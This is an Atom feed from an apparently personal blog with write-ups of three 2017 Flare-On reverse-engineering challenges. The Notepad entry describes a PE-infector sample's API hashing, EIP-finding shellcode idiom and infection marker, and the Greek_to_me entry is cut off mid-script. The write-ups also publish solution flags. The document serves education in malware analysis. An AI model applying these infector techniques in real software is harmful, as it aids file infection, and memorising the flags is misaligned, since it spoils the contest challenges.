<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

 <title>Lynn's Blog</title>
 <link href="http://0.0.0.0:4000/atom.xml" rel="self"/>
 <link href="http://0.0.0.0:4000/"/>
 <updated>2018-08-20T04:18:31+08:00</updated>
 <id>http://0.0.0.0:4000</id>
 <author>
   <name>Lynn Wu</name>
   <email>0x000050@gmail.com</email>
 </author>

 
 <entry>
   <title>2017 Flare-On Challenge 5 pewpewboat.exe</title>
   <link href="http://0.0.0.0:4000/2018/05/24/2017-Flare-On-5-pewpewboat.html"/>
   <updated>2018-05-24T00:00:00+08:00</updated>
   <id>http://0.0.0.0:4000/2018/05/24/2017 Flare-On #5 pewpewboat</id>
   <content type="html">&lt;p&gt;Actually, &lt;code class=&quot;highlighter-rouge&quot;&gt;pewpewboat.exe&lt;/code&gt; is not a Windows	PE file but an x64 ELF binary. When we launch the binary in linux, we can see that is a the Battleship game.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Loading first pew pew map...
   1 2 3 4 5 6 7 8
  _________________
A |_|_|_|_|_|_|_|_|
B |_|_|_|_|_|_|_|_|
C |_|_|_|_|_|_|_|_|
D |_|_|_|_|_|_|_|_|
E |_|_|_|_|_|_|_|_|
F |_|_|_|_|_|_|_|_|
G |_|_|_|_|_|_|_|_|
H |_|_|_|_|_|_|_|_|

Rank: Seaman Recruit

Welcome to pewpewboat! We just loaded a pew pew map, start shootin'!

Enter a coordinate:
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s try to typing some “coordinate” to see what happens. There will be two results: &lt;code class=&quot;highlighter-rouge&quot;&gt;You missed :( &lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;Nice shot!	Hit!&lt;/code&gt;, if we get all of we need to hit coordinate, we can get message &lt;code class=&quot;highlighter-rouge&quot;&gt;sunk all the ships&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   1 2 3 4 5 6 7 8
A |_|_|_|_|_|_|_|_|
B |_|_|_|X|X|X|X|_|
C |_|_|_|X|_|_|_|_|
D |_|_|_|X|_|_|_|_|
E |_|_|_|X|X|X|X|_|
F |_|_|_|X|_|_|_|_|
G |_|_|_|X|_|_|_|_|
H |_|_|_|_|_|_|_|_|

Rank: Seaman Recruit

Nice shot! Hit!
You sunk all the ships!!


NotMd5Hash(&quot;BNKM&quot;) &amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And we need to typing something in last line &lt;code class=&quot;highlighter-rouge&quot;&gt;NotMd5Hash(&quot;BNKM&quot;) &amp;gt;&lt;/code&gt;, when we try a few times, we can know the letters inside the quotation mark is random. So we can patch the verification method, in order for us to continue to the next game.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Analysis:&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We can install “gdbserver” tool in ubuntu, and bind ip in &lt;code class=&quot;highlighter-rouge&quot;&gt;0.0.0.0&lt;/code&gt;. Thus we can dynamically debug with IDA Pro.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x403530&lt;/code&gt; function for &lt;code class=&quot;highlighter-rouge&quot;&gt;notmd5hash&lt;/code&gt;, in this function we can find words and &lt;code class=&quot;highlighter-rouge&quot;&gt;rand()&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  v7 = 'N';
  v8 = 'o';
  v9 = 't';
  v10 = 'M';
  v11 = 'd';
  v12 = '5';
  v13 = 'H';
  v14 = 'a';
  v15 = 's';
  v16 = 'h';
  v17 = '(';
  v18 = '&quot;';
  v19 = '%';
  v20 = 's';
  v21 = '&quot;';
  v22 = ')';
  v23 = ' ';
  v24 = '&amp;gt;';
  v25 = ' ';
  v26 = '\0';
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After we patch &lt;code class=&quot;highlighter-rouge&quot;&gt;0x403BE0 call sub_403530&lt;/code&gt;, we can make the position guess of the coordinates more smoothly, or reversing to find the correct coordinates in the binary.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Solutions:&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I once also solved a challenge about Battleship game, the challenge name was &lt;a href=&quot;http://0x00.tw/2017/08/26/2017-HITCON-CMT-mini-wargame/&quot;&gt;winmine.exe&lt;/a&gt;, one of challenge in HITCON CMT 2017 mini wargame. At that time, I reverse to find correct coordinates in binary. After the game, someone provided a different solution for me, I think this solution is very interesting. That is using &lt;a href=&quot;https://www.vmware.com/tw/products/workstation-pro.html&quot;&gt;vmware workstation snapshot&lt;/a&gt; to remember the game screen that has been marked.&lt;/p&gt;

&lt;p&gt;We collect letters every turn, when we sunk all the ships, we got the those letters from game screen.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;F
H
G
U
Z
R
E
J
V
O
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Reaching the final level, we got those message&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;You sunk all the ships!!
   1 2 3 4 5 6 7 8
A |_|_|_|_|_|_|_|_|
B |_|_|_|_|_|_|_|_|
C |_|_|_|_|_|_|_|_|
D |_|_|_|_|_|_|_|_|
E |_|_|_|_|_|_|_|_|
F |_|_|_|_|_|_|_|_|
G |_|_|_|_|_|_|_|_|
H |_|_|_|_|_|_|_|_|
                   
Rank: Congratulation!
                     
Aye!PEWYouPEWfoundPEWsomePEWlettersPEWdidPEWya?PEWToPEWfindPEWwhatPEWyou'rePEWlookingPEWfor,PEWyou'llPEWwantPEWtoPEWre-orderPEWthem:PEW9,PEW1,PEW2,PEW7,PEW3,PEW5,PEW6,PEW5,PEW8,PEW0,PEW2,PEW3,PEW5,PEW6,PEW1,PEW4.
PEWNextPEWyouPEWletPEW13PEWROTPEWinPEWthePEWsea!PEWTHEPEWFINALPEWSECRETPEWCANPEWBEPEWFOUNDPEWWITHPEWONLYPEWTHEPEWUPPERPEWCASE.
Thanks for playing!  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After we delete “PEW” words, we can get real messages.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Aye! You found some letters did ya? To find what you're looking for, you'll want to
re-order them:
9, 1, 2, 7, 3, 5, 6, 5, 8, 0, 2, 3, 5, 6, 1, 4.

Next you let 13 ROT in the sea! THE FINAL SECRET CAN BE FOUND WITH ONLY THE UPPER CASE.

Thanks for playing!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;According this message to re-order we collect letters &lt;code class=&quot;highlighter-rouge&quot;&gt;FHGUZREJVO&lt;/code&gt;. The result is &lt;code class=&quot;highlighter-rouge&quot;&gt;OHGJURERVFGUREHZ&lt;/code&gt;. Next, let “ROT13” the string to become &lt;code class=&quot;highlighter-rouge&quot;&gt;BUTWHEREISTHERUM&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   1 2 3 4 5 6 7 8
A |_|_|_|_|_|_|_|_|
B |_|_|_|_|_|_|_|_|
C |_|_|_|_|_|_|_|_|
D |_|_|_|_|_|_|_|_|
E |_|_|_|_|_|_|_|_|
F |_|_|_|_|_|_|_|_|
G |_|_|_|_|_|_|_|_|
H |_|_|_|_|_|_|_|_|

Rank: Seaman Recruit

Welcome to pewpewboat! We just loaded a pew pew map, start shootin'!

Enter a coordinate: BUTWHEREISTHERUM

 very nicely done!  here have this key:  y0u__sUnK_mY__P3Wp3w_b04t@flare-on.com

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The flag is: &lt;code class=&quot;highlighter-rouge&quot;&gt;y0u__sUnK_mY__P3Wp3w_b04t@flare-on.com&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;
&lt;ul&gt;
  &lt;li&gt;Challenge Author: Tyler Dean (@spresec)&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/0x000050/CTF/blob/master/2017_Flare-On/05_Pewpewboat/pewpewboat.exe&quot;&gt;Challenge download&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
 </entry>
 
 <entry>
   <title>2017 Flare-On Challenge 4 Notepad.exe</title>
   <link href="http://0.0.0.0:4000/2018/05/23/2017-Flare-On-4-notepad.html"/>
   <updated>2018-05-23T00:00:00+08:00</updated>
   <id>http://0.0.0.0:4000/2018/05/23/2017 Flare-On #4 notepad</id>
   <content type="html">&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Notepad.exe&lt;/code&gt; is a Windows x86 executable, it seems to be a modified version of Microsoft’s &lt;code class=&quot;highlighter-rouge&quot;&gt;Notepad.exe&lt;/code&gt;. Let’s launch this binary and it looks nothing special.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/ZtdIJB9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Analysis:&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;IDA can properly apply Microsoft’s PDB for &lt;code class=&quot;highlighter-rouge&quot;&gt;Notepad.exe&lt;/code&gt; from Microsoft’s symbol server. But the entry point of executable has been modified to &lt;code class=&quot;highlighter-rouge&quot;&gt;0x1013a00&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/6KjROey.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Go to &lt;code class=&quot;highlighter-rouge&quot;&gt;0x1013a00&lt;/code&gt; function, we can see  interesting thing is entry point in the &lt;code class=&quot;highlighter-rouge&quot;&gt;.rsrc&lt;/code&gt; section, instead of &lt;code class=&quot;highlighter-rouge&quot;&gt;.text&lt;/code&gt; section. And we can see interesting strings: &lt;code class=&quot;highlighter-rouge&quot;&gt;%USERPROFILE%\flareon2016challenge&lt;/code&gt; This is hint means you will need the binaries from the “flareon 2016 challenges”. (We can download these files from the &lt;a href=&quot;http://www.flare-on.com/&quot;&gt;official website&lt;/a&gt;), at the same time,  using stack based strings is also one of the skills of malware.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/jWZce3e.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here we can restore these strings:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;%USERPROFILE%\flareon2016challenge
ImageHlp.dll
CheckSumMappedFile
User32.dll
MessageBoxA
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;And we can get other strings from “Strings window” in IDA&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;\\key.bin
%USERPROFILE%
\\flareon2016challenge
where's my key file?
what's wrong with my key file?
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After that, we can see other one skills of malware: Dynamically loading library modules. we can using IDA dynamically debug to understand those library. This is originally version.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  v77 = 0x1013C4E;
  v6 = sub_10153D0(0x8FECD63F);
  v89 = sub_1015310(v6, 0x63D6C065);
  v90 = sub_1015310(v6, 0xA5E1AC97);
  v91 = sub_1015310(v6, 0x23545978);
  v93 = sub_1015310(v6, 0x7C0017A5);
  v94 = sub_1015310(v6, 0x56C61229);
  v95 = sub_1015310(v6, 0x7B073C59);
  v96 = sub_1015310(v6, 0xFFD97FB);
  v109 = sub_1015310(v6, 0x10FA6516);
  v97 = sub_1015310(v6, 0xE80A791F);
  v98 = sub_1015310(v6, 0xDF7D9BAD);
  v99 = sub_1015310(v6, 0xB12C56D7);
  v100 = sub_1015310(v6, 0xEC0E4E8E);
  v101 = sub_1015310(v6, 0x7C0DFCAA);
  v103 = sub_1015310(v6, 0xD3324904);
  v104 = sub_1015310(v6, 0xB2089259);
  v105 = sub_1015310(v6, 0xEEB585D8);
  v106 = sub_1015310(v6, 0x3810CB0F);
  v107 = sub_1015310(v6, 0xF02A93BE);
  v108 = sub_1015310(v6, 0xF72A53BA);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;First, we follow first line &lt;code class=&quot;highlighter-rouge&quot;&gt;v77 = 0x1013c4e&lt;/code&gt;, that means &lt;code class=&quot;highlighter-rouge&quot;&gt;v77&lt;/code&gt;’s value stored &lt;code class=&quot;highlighter-rouge&quot;&gt;EIP&lt;/code&gt;. We can change assembly view to understand it, first line is &lt;code class=&quot;highlighter-rouge&quot;&gt;$+5&lt;/code&gt; also mean &lt;code class=&quot;highlighter-rouge&quot;&gt;$pc+5&lt;/code&gt;. In IDA, &lt;code class=&quot;highlighter-rouge&quot;&gt;$&lt;/code&gt; is beginning of same instruction (which is not the &lt;code class=&quot;highlighter-rouge&quot;&gt;EIP&lt;/code&gt; which would point to the next instruction). And &lt;code class=&quot;highlighter-rouge&quot;&gt;call $+5&lt;/code&gt; is probably call to next instruction, and next line for &lt;code class=&quot;highlighter-rouge&quot;&gt;pop&lt;/code&gt; address, such usage usually used to write shellcode, it used to get EIP address.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.rsrc:01013C49 call    $+5              //$pc+5
.rsrc:01013C4E pop     [ebp+var_88]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and we can using IDA dynamically debug to get those library’s name.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  v77 = 0x1013C4E;                              // $+5
  user32.dll = sub_10153D0(0x8FECD63F);
  kernel32_FindFirstFileA = sub_1015310(user32.dll, 0x63D6C065);
  kernel32_FindNextFileA = sub_1015310(user32.dll, 0xA5E1AC97);
  kernel32_FindClose = sub_1015310(user32.dll, 0x23545978);
  kernel32_CreateFileA = sub_1015310(user32.dll, 0x7C0017A5);
  kernel32_CreateFileMappingA = sub_1015310(user32.dll, 0x56C61229);
  kernel32_MapViewOfFile = sub_1015310(user32.dll, 0x7B073C59);
  kernel32_CloseHandle = sub_1015310(user32.dll, 0xFFD97FB);
  kernel32_ReadFile = sub_1015310(user32.dll, 0x10FA6516);
  kernel32_WriteFile = sub_1015310(user32.dll, 0xE80A791F);
  kernel32_GetFileSize = sub_1015310(user32.dll, 0xDF7D9BAD);
  kernel32_FlushViewOfFile = sub_1015310(user32.dll, 0xB12C56D7);
  kernel32_LoadLibraryA = sub_1015310(user32.dll, 0xEC0E4E8E);
  kernel32_GetProcAddress = sub_1015310(user32.dll, 0x7C0DFCAA);
  kernel32_GetModuleHandleA = sub_1015310(user32.dll, 0xD3324904);
  kernel32_UnmapViewOfFile = sub_1015310(user32.dll, 0xB2089259);
  kernel32_ExpandEnvironmentStringsA = sub_1015310(user32.dll, 0xEEB585D8);
  kernel32_FileTimeToSystemTime = sub_1015310(user32.dll, 0x3810CB0F);
  kernel32_GetTimeFormatA = sub_1015310(user32.dll, 0xF02A93BE);
  kernel32_GetDateFormatA = sub_1015310(user32.dll, 0xF72A53BA);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;At the end of the entry point’s function, we know the program then proceeds to look for files in &lt;code class=&quot;highlighter-rouge&quot;&gt;%USERPROFILE%\flareon2016challenge&lt;/code&gt; that have PE-headers using the &lt;code class=&quot;highlighter-rouge&quot;&gt;FindFirstFileA&lt;/code&gt; / &lt;code class=&quot;highlighter-rouge&quot;&gt;FindNextFileA&lt;/code&gt; API. When it finds an executable file, calling the function at &lt;code class=&quot;highlighter-rouge&quot;&gt;0x1014E20&lt;/code&gt; to infect it. This type malware is called &lt;code class=&quot;highlighter-rouge&quot;&gt;PE infector&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;At &lt;code class=&quot;highlighter-rouge&quot;&gt;0x1014E20&lt;/code&gt; function, it will be find MZ haeder, PE header, compares timestamp value and infector other PE file. About PE executable format, we can using “010 editor” tool’s PE template &lt;a href=&quot;https://www.sweetscape.com/010editor/templates/&quot;&gt;PETemplate.bt&lt;/a&gt; to assist analysis PE timestamp. At &lt;code class=&quot;highlighter-rouge&quot;&gt;0x10146C0&lt;/code&gt;, it compares the compile timestamp value of the PE file that is currently executing against a hard-coded value, then compares the compile timestamp value of the discovered PE against another hard-coded value. This comparison is repeated for several pairs of timestamp values until both are matched. At &lt;code class=&quot;highlighter-rouge&quot;&gt;0x1014E20&lt;/code&gt;, the infection code at &lt;code class=&quot;highlighter-rouge&quot;&gt;0x101500B&lt;/code&gt;, it checks for the value &lt;code class=&quot;highlighter-rouge&quot;&gt;0x8675309&lt;/code&gt; at offset &lt;code class=&quot;highlighter-rouge&quot;&gt;0x1C&lt;/code&gt; in the PE and does not infect it if found. When infecting, it adds this value to that offset of the PE. This is known as an “infection marker” Make sure the execute file is only infected once.&lt;/p&gt;

&lt;p&gt;When a successful match is found the second timestamp value is converted to a string and printed in a message box and generate &lt;code class=&quot;highlighter-rouge&quot;&gt;key.bin&lt;/code&gt;. About &lt;code class=&quot;highlighter-rouge&quot;&gt;key.bin&lt;/code&gt;, we can follow &lt;code class=&quot;highlighter-rouge&quot;&gt;0x10145B0&lt;/code&gt; function, where eight bytes from offset &lt;code class=&quot;highlighter-rouge&quot;&gt;0x0C&lt;/code&gt; in the PE is appended to a file named &lt;code class=&quot;highlighter-rouge&quot;&gt;key.bin&lt;/code&gt;. This is first message box pop up.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/R2IiXIW.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Solutions:&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;So far we know that we need some files that meet the requirements (timestamp) in 2016’s FLARE On challenge. After finding it, put those files in the &lt;code class=&quot;highlighter-rouge&quot;&gt;%USERPROFILE%\flareon2016challenge&lt;/code&gt; directory. Next, &lt;code class=&quot;highlighter-rouge&quot;&gt;notepad.exe&lt;/code&gt; will check the timestamp of those files. If it match, the file timestamp value is converted to a string and printed in a message box, and where “eight bytes” from offset &lt;code class=&quot;highlighter-rouge&quot;&gt;0x0C&lt;/code&gt; in the PE is appended to ` Key .bin` file.&lt;/p&gt;

&lt;p&gt;In the &lt;code class=&quot;highlighter-rouge&quot;&gt;0x1014B4B&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;0x1014D0A&lt;/code&gt; code block, it used to check the timestamp of the file and write &lt;code class=&quot;highlighter-rouge&quot;&gt;key.bin&lt;/code&gt; file, we total need of four files, include the order of file and file timestamp&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Timestamp of infected file&lt;/th&gt;
      &lt;th&gt;Timestamp of 2016’s FLARE On challenge&lt;/th&gt;
      &lt;th&gt;challenge name&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;0x57D1B2A2&lt;/td&gt;
      &lt;td&gt;0x48025287&lt;/td&gt;
      &lt;td&gt;(Challenge1) challenge1.exe&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;0x57D2B0F8&lt;/td&gt;
      &lt;td&gt;0x57d1b2a2&lt;/td&gt;
      &lt;td&gt;(Challenge2) DudeLocker.exe&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;0x49180192&lt;/td&gt;
      &lt;td&gt;0x57D2B0F8&lt;/td&gt;
      &lt;td&gt;(Challenge6) khaki.exe&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;0x579E9100&lt;/td&gt;
      &lt;td&gt;0x49180192&lt;/td&gt;
      &lt;td&gt;(Challenge3) unknow&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;The final timestamp value comparison is only performed on the running executable. If it matches, 32 bytes are read from the &lt;code class=&quot;highlighter-rouge&quot;&gt;key.bin&lt;/code&gt; file and are XORed against a 32 byte string of unprintable characters stored in a local variable.&lt;/p&gt;

&lt;p&gt;Finally, Running the binaries in this order is challenge 1.exe, DudeLocker.exe, khaki.exe, and unknown. We can get the flag in message box.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;bl457_fr0m_th3_p457@flare-on.com&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;
&lt;ul&gt;
  &lt;li&gt;Challenge Author: James T. Bennett (@jtbennettjr)&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/0x000050/CTF/blob/master/2017_Flare-On/04_Notepad/notepad.exe&quot;&gt;Challenge download&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
 </entry>
 
 <entry>
   <title>2017 Flare-On Challenge 3 Greektome.exe</title>
   <link href="http://0.0.0.0:4000/2018/05/22/2017-Flare-On-3-Greektome.html"/>
   <updated>2018-05-22T00:00:00+08:00</updated>
   <id>http://0.0.0.0:4000/2018/05/22/2017 Flare-On #3 Greektome</id>
   <content type="html">&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Greek_to_me.exe&lt;/code&gt; is a Windows x86 executable. When we launch the binary, we can’t input anything, and we don’t get any output from the binary. It gets stuck waiting for us to do something.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Analysis:&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;When we open it in IDA, we can see it contains the &lt;code class=&quot;highlighter-rouge&quot;&gt;socket&lt;/code&gt; function at &lt;code class=&quot;highlighter-rouge&quot;&gt;0x401151&lt;/code&gt;, the binary using a standard series of Windows API functions: &lt;code class=&quot;highlighter-rouge&quot;&gt;socket&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;bind&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;listen&lt;/code&gt;, and &lt;code class=&quot;highlighter-rouge&quot;&gt;accept&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;So far we know the binary listening for a TCP connection from localhost on port 2222 (0x8AE). It then proceeds to read up to 8-bit register in &lt;code class=&quot;highlighter-rouge&quot;&gt;sub_401121&lt;/code&gt;, and the input is a 32-bit integer.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/szZCmXr.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Additionally, there has some interesting string of the program at virtual address &lt;code class=&quot;highlighter-rouge&quot;&gt;0x401101&lt;/code&gt;, that is &lt;code class=&quot;highlighter-rouge&quot;&gt;Congratulations! But wait, where',27h,'s my flag?&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/fSeXBij.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;At &lt;code class=&quot;highlighter-rouge&quot;&gt;0x401036&lt;/code&gt;, the first byte from the recv buffer is moved into the lower eight bits of the EDX register. Then, focus on &lt;code class=&quot;highlighter-rouge&quot;&gt;loc_40107C&lt;/code&gt; function and &lt;code class=&quot;highlighter-rouge&quot;&gt;loc_401039&lt;/code&gt; function, the address &lt;code class=&quot;highlighter-rouge&quot;&gt;0x40107C&lt;/code&gt; is moved into the &lt;code class=&quot;highlighter-rouge&quot;&gt;EAX&lt;/code&gt; register, representing the start address for the decoding loop.&lt;/p&gt;

&lt;p&gt;The decoding loop contains some operations. First of all, take a one byte at the address stored in &lt;code class=&quot;highlighter-rouge&quot;&gt;EAX&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;0x40107C&lt;/code&gt;). Next, XOR the extracted byte with the first byte received over the listening socket, then incremented by 34 (0x22). Use the resulting byte to overwrite the byte extracted in &lt;code class=&quot;highlighter-rouge&quot;&gt;EAX&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/tx8jK96.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Further, &lt;code class=&quot;highlighter-rouge&quot;&gt;sub_4011E6&lt;/code&gt; function is used to hash, arguments are the start address of the modified code (&lt;code class=&quot;highlighter-rouge&quot;&gt;0x40107C&lt;/code&gt;) and the length value 121 (0x79). In &lt;code class=&quot;highlighter-rouge&quot;&gt;sub_4011E6&lt;/code&gt; function, a 16 bits (&lt;code class=&quot;highlighter-rouge&quot;&gt;AX&lt;/code&gt;) hash data is calculated and checked against 64350 (0xFB5E) for equality. If the hash data matches, the code is executed, without getting an error message &lt;code class=&quot;highlighter-rouge&quot;&gt;Nope, that’s not it&lt;/code&gt;.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Solutions:&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The key is only a single byte, but there are 256 possibilities. Following python code to help us get &lt;code class=&quot;highlighter-rouge&quot;&gt;0xA2&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;ó&lt;/code&gt;) as the key:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt; 
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;string&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;#scoket info&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;HOST&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'127.0.0.1'&lt;/span&gt;    
&lt;span class=&quot;n&quot;&gt;PORT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2222&lt;/span&gt;              

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
	&lt;span class=&quot;c&quot;&gt;#open exe&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;filepath&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'greek_to_me.exe'&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;startfile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filepath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.1&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

	&lt;span class=&quot;c&quot;&gt;#connect socket&lt;/span&gt;
